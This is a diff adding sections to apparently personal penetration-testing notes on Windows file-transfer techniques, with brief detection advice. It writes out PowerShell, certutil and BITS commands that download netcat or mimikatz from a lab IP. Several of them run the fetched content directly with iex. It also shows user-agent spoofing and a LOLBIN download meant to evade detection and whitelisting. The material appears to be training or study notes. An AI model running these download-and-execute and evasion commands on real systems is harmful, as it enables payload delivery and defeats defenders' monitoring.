@@ -792,3 +792,82 @@ __Download a File with Certutil__
 ```
 certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
 ```
+# Detection
+
+Command-line detection using blacklisting can be easily bypassed, but whitelisting command lines is more robust, allowing for quicker detection of unusual activity. In client-server protocols, especially HTTP, the client and server negotiate how content is delivered. The HTTP client is identified by its user agent string (e.g., Firefox, Chrome, cURL). Organizations can compile lists of known legitimate user agents, such as those used by default OS processes or update services, and feed them into a SIEM tool for threat hunting. Suspicious user agents can then be investigated for potential malicious actions, including file transfers.
+
+__Invoke-WebRequest - Client__
+```
+Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
+```
+```
+Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
+```
+__Invoke-WebRequest - Server__ 
+![image](https://github.com/user-attachments/assets/23b6f990-2405-49f3-85d3-8f89443a4615)
+
+__WinHttpRequest - Client__ 
+```
+$h=new-object -com WinHttp.WinHttpRequest.5.1;
+$h.open('GET','http://10.10.10.32/nc.exe',$false);
+$h.send();
+iex $h.ResponseText
+```
+__WinHttpRequest - Server__ 
+![image](https://github.com/user-attachments/assets/b2e516b8-62d0-420a-bb4f-f7bb8d100f1c)
+
+__Msxml2 - Client__ 
+```
+$h=New-Object -ComObject Msxml2.XMLHTTP;
+$h.open('GET','http://10.10.10.32/nc.exe',$false);
+$h.send();
+iex $h.responseText
+```
+__Msxml2 - Server__
+![image](https://github.com/user-attachments/assets/5f25bdfa-057c-4845-924b-e7afba210f21)
+
+__Certutil - Client__ 
+```
+certutil -urlcache -split -f http://10.10.10.32/nc.exe 
+certutil -verifyctl -split -f http://10.10.10.32/nc.exe
+```
+![image](https://github.com/user-attachments/assets/ad69271f-0205-489f-99ce-24190edd3242)
+
+__BITS - Client__ 
+```
+Import-Module bitstransfer;
+Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
+$r=gc $env:temp\t;
+rm $env:temp\t; 
+iex $r
+```
+![image](https://github.com/user-attachments/assets/10fbb800-5c31-462f-9a27-934c6ea14121)
+
+# Evading Detection
+
+## Changing User Agents 
+Invoke-WebRequest in PowerShell has a UserAgent parameter that allows changing the default user agent to emulate browsers like Internet Explorer, Firefox, or Chrome. If administrators have blacklisted certain user agents, setting the user agent to a commonly used one (e.g., Chrome) can make the request appear legitimate and bypass detection.
+
+__Listing out User Agents__ (windows)
+```
+[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
+```
+Invoking Invoke-WebRequest to download nc.exe using a Chrome User Agent:
+
+__Request with Chrome User Agent__
+```
+$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
+```
+![image](https://github.com/user-attachments/assets/2e79ab38-3d73-41bc-929a-ceb94d644b4f)
+
+## LOLBAS / GTFOBins
+Application whitelisting may block PowerShell or Netcat, and command-line logging can alert defenders. A way around this is using LOLBINs (living off the land binaries), which are trusted system binaries with exploitable functionality. For example, Intel's GfxDownloadWrapper.exe on Windows 10 can be used to download configuration files, allowing attackers to leverage its functionality without raising suspicion.
+
+__Transferring File with GfxDownloadWrapper.exe__
+```
+GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
+```
+Such a binary might be permitted to run by application whitelisting and be excluded from alerting. Other, more commonly available binaries are also available, and it is worth checking the [LOLBAS](https://lolbas-project.github.io/) project to find a suitable "file download" binary that exists in your environment. Linux's equivalent is the [GTFOBins project](https://gtfobins.github.io/) and is definitely also worth checking out. 
+
+
